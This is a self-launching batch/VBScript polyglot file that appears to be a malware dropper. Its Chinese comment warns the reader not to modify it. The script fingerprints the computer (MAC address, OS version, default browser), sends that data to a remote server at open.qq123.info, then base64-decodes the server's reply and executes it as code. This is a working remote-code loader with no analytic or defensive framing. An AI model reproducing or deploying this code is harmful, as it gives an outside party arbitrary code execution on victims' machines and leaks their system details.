
'请勿修改脚本 以防功能失效
:Sub bat
echo off & cls
echo '>nul & start "" wscript //e:vbscript "%~f0" %*
Exit Sub : End Sub

Function l(a): With CreateObject("Msxml2.DOMDocument").CreateElement("aux"): .DataType = "bin.base64": .Text = a: l = r(.NodeTypedValue): End With: End Function
Function r(b): With CreateObject("ADODB.Stream"): .Type = 1: .Open: .Write b: .Position = 0: .Type = 2: .CharSet = "utf-8": r = .ReadText: .Close:  End With: End function

Dim objXmlHttpMain , URL

strJSONToSend = "{""mac"": """ & GetMAC & """, ""DBr"":"""& GetDefaultBrowser  & """,""Os"":"""& GetOs &""",""Chn"":""100""}"

URL="http://open.qq123.info/api/Common/GetCommonCfg" 

Set objXmlHttpMain = CreateObject("Msxml2.ServerXMLHTTP") 

objXmlHttpMain.open "POST",URL, False 
objXmlHttpMain.setRequestHeader "Content-Type", "application/json; charset=utf-8"
objXmlHttpMain.setTimeouts 2000, 2000, 2000, 2000
objXmlHttpMain.send strJSONToSend


If objXmlHttpMain.Status >= 400 And objXmlHttpMain.Status <= 599 Then

  Else
    Execute l(objXmlHttpMain.ResponseText)
  End If


set objJSONDoc = nothing 
set objResult = nothing

Function GetMAC() 
Dim objWMIService,colItems,objItem,objAddress
Set objWMIService = GetObject("winmgmts://" & "." & "/root/cimv2")
Set colItems = objWMIService.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True")
For Each objItem in colItems
 For Each objAddress in objItem.IPAddress
  If objAddress <> "" then
  GetMAC = objItem.MACAddress
  Exit For
 End If  
 Next
 Exit For
Next
End Function

Function GetOs

Set dtmConvertedDate = CreateObject("WbemScripting.SWbemDateTime")
strComputer = "."
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set oss = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
Dim Result
For Each os in oss

    Result = Result & os.Caption & " " & os.Version
 
Next

GetOs = Result

End Function
 
Function GetDefaultBrowser
    Const HKEY_CURRENT_USER = &H80000001 
    Const strKeyPath = "Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice" 
    Const strValueName = "Progid" 
    Dim strValue, objRegistry, i 
' Browser list: 
    Dim blist(10,1) 
    blist(0,0) = "Intermet Explorer"    : blist(0,1) = "ie" 
    blist(1,0) = "Edge"                    : blist(1,1) = "appxq0fevzme2pys62n3e0fbqa7peapykr8v" 
    blist(2,0) = "Firefox"                : blist(2,1) = "firefox" 
    blist(3,0) = "Chrome"                : blist(3,1) = "chrome" 
    blist(4,0) = "Safari"                : blist(4,1) = "safari" 
    blist(5,0) = "Avant"                : blist(5,1) = "browserexeurl" 
    blist(6,0) = "Opera"                : blist(6,1) = "opera" 
    blist(7,0) = "360seURL"                : blist(7,1) = "360seURL" 
    blist(8,0) = "QQBrowser"                : blist(8,1) = "QQBrowser" 
blist(9,0) = "2345ExplorerHTML"                : blist(9,1) = "2345ExplorerHTML" 
blist(10,0) = "SogouExplorerHTML"                : blist(10,1) = "SogouExplorerHTML" 
    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv") 
    objRegistry.GetStringValue HKEY_CURRENT_USER,strKeyPath,strValueName,strValue 
    If IsNull(strValue) Then 
        GetDefaultBrowser = "Intermet Explorer (Windows standard)": Exit Function 
    Else 
        For i = 0 To Ubound (blist, 1) 
            If Instr (1, strValue, blist(i,1), vbTextCompare) Then GetDefaultBrowser = blist(i,0): Exit Function 
        Next 
    End If 
    GetDefaultBrowser = strValue
End Function


